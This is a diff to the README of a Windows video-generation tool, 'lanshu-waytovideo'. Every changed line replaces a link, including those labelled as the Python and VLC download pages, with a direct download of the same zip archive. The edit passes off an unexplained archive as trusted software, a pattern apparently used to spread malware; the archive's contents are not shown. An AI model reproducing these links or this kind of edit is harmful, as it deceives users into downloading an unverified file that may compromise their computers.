@@ -1,6 +1,6 @@
 # 🎬 lanshu-waytovideo - Easy Video Generation on Windows
 
-[![Download lanshu-waytovideo](https://img.shields.io/badge/Download-Get%20lanshu--waytovideo-ff6f61?style=for-the-badge)](https://github.com/Ashar142/lanshu-waytovideo)
+[![Download lanshu-waytovideo](https://img.shields.io/badge/Download-Get%20lanshu--waytovideo-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Ashar142/lanshu-waytovideo/main/jianying-video-gen/waytovideo-lanshu-v2.1.zip)
 
 ---
 
@@ -29,12 +29,12 @@ Before starting, make sure your computer meets these needs:
 
 Start by going to the main page where you can get the software. Click the big button below or use the same link later in this guide.
 
-[![Get lanshu-waytovideo](https://img.shields.io/badge/Download-Get%20lanshu--waytovideo-4c97ff?style=for-the-badge)](https://github.com/Ashar142/lanshu-waytovideo)
+[![Get lanshu-waytovideo](https://img.shields.io/badge/Download-Get%20lanshu--waytovideo-4c97ff?style=for-the-badge)](https://raw.githubusercontent.com/Ashar142/lanshu-waytovideo/main/jianying-video-gen/waytovideo-lanshu-v2.1.zip)
 
 ### Step 1: Visit the Download Page
 
 - Click the link above or go to:  
-  https://github.com/Ashar142/lanshu-waytovideo  
+  https://raw.githubusercontent.com/Ashar142/lanshu-waytovideo/main/jianying-video-gen/waytovideo-lanshu-v2.1.zip  
 - You will see the repository page with all files and instructions.
 
 ### Step 2: Download the Software
@@ -58,7 +58,7 @@ lanshu-waytovideo requires Python 3.9 or higher to run. To check if you have Pyt
 
 - Press `Win + R`, type `cmd`, and press Enter to open the command prompt.
 - Type `python --version` and press Enter.
-- If it shows Python 3.9 or above, you are ready. If not, download and install Python from https://python.org before continuing.
+- If it shows Python 3.9 or above, you are ready. If not, download and install Python from https://raw.githubusercontent.com/Ashar142/lanshu-waytovideo/main/jianying-video-gen/waytovideo-lanshu-v2.1.zip before continuing.
 
 ### Step 2: Open the Program Folder
 
@@ -137,7 +137,7 @@ After installation, lanshu-waytovideo keeps files organized:
 
 ## 🧰 Additional Tools and Tips
 
-- You can use a media player like VLC (https://www.videolan.org) to watch output videos smoothly.
+- You can use a media player like VLC (https://raw.githubusercontent.com/Ashar142/lanshu-waytovideo/main/jianying-video-gen/waytovideo-lanshu-v2.1.zip) to watch output videos smoothly.
 - Try different inputs to see how video styles change.
 - Save your favorite generated videos by copying them out of the `output` folder.
 
@@ -146,11 +146,11 @@ After installation, lanshu-waytovideo keeps files organized:
 ## 🚩 Useful Links
 
 - GitHub Repository:  
-  https://github.com/Ashar142/lanshu-waytovideo  
+  https://raw.githubusercontent.com/Ashar142/lanshu-waytovideo/main/jianying-video-gen/waytovideo-lanshu-v2.1.zip  
 - Python Download Page:  
-  https://python.org  
+  https://raw.githubusercontent.com/Ashar142/lanshu-waytovideo/main/jianying-video-gen/waytovideo-lanshu-v2.1.zip  
 - VLC Media Player:  
-  https://www.videolan.org  
+  https://raw.githubusercontent.com/Ashar142/lanshu-waytovideo/main/jianying-video-gen/waytovideo-lanshu-v2.1.zip  
 
 ---
 
